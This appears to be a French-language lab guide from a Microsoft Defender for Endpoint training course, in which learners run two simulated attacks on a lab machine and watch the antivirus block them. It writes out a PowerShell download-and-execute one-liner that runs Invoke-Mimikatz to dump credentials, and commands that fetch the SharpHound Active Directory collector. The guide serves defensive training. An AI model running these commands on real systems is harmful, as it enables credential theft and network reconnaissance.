# Module 2 Démo : atténuation des menaces avec Microsoft Defender pour point de terminaison

**Remarque** : la réussite de cette démonstration dépend de l’exécution correcte de toutes les étapes décrites dans le [document sur les conditions préalables](00-prerequisites.md).

## Attaques simulées

Dans cette tâche, vous allez exécuter deux attaques simulées pour explorer les fonctionnalités de Microsoft Defender for Endpoint.

1. Si vous n’êtes pas déjà sur le portail Microsoft Defender XDR dans votre navigateur, accédez à Microsoft Defender XDR à l’adresse (<https://security.microsoft.com>) en vous connectant en tant qu’administrateur pour votre locataire.

Vous exécuterez les attaques *simulées* à l’aide de *PowerShell* sur *WIN1* pour explorer les fonctionnalités de Microsoft Defender pour point de terminaison.

`Attack 1: Mimikatz - Credential Dumping`

1. Sur l’ordinateur *WIN1*, tapez **Commande** dans la barre de recherche, puis sélectionnez **Exécuter en tant qu’administrateur**.

1. Copiez et collez la commande suivante dans la fenêtre **Administrateur : invite de commandes**, puis appuyez sur **Entrée** pour l’exécuter.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Vous devez voir un message indiquant que l’*Accès est refusé* ainsi qu’un message contextuel de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` affichant *Menaces trouvées*.

1. Quittez la fenêtre **Administrateur : invite de commandes** en tapant **quitter** et en appuyant sur **Entrée**.

`Attack 2: Bloodhound - Collection`

1. Sur l’ordinateur *WIN1*, entrez **PowerShell** dans la barre de recherche, sélectionnez **Windows PowerShell**, puis **Exécuter en tant qu’administrateur**.

1. Copiez et collez les commandes suivantes dans la fenêtre **Administrateur : Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Remarque :** Il est recommandé de copier, coller et exécuter les commandes une par une. Vous pouvez ouvrir *Bloc-notes* et copier les commandes dans un fichier temporaire pour y parvenir. La première commande crée un dossier nommé *ExternalPayloads* dans le même dossier que le dossier *Atomic Red Team*. La deuxième commande télécharge le fichier *SharpHound.ps1* à partir du référentiel GitHub *BloodHound* et l’enregistre dans le dossier *ExternalPayloads*.

1. Un message contextuel s’affiche à partir de `Windows Security Virus and threats protection` affichant *Menaces trouvées*.

1. Copiez et collez la commande suivante dans la fenêtre **Administrateur : Windows PowerShell**, puis appuyez sur **Entrée** pour l’exécuter.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Si la sortie a la valeur *True*, le fichier de charge utile du programme malveillant n’a pas été supprimé par Microsoft Defender Antivirus. Si la sortie a la valeur *False*, le fichier de charge utile du programme malveillant a été supprimé par Microsoft Defender Antivirus. Utilisez la touche de direction vers le haut pour répéter la commande jusqu’à ce que la sortie soit *False*.

## Vous avez terminé la démonstration.
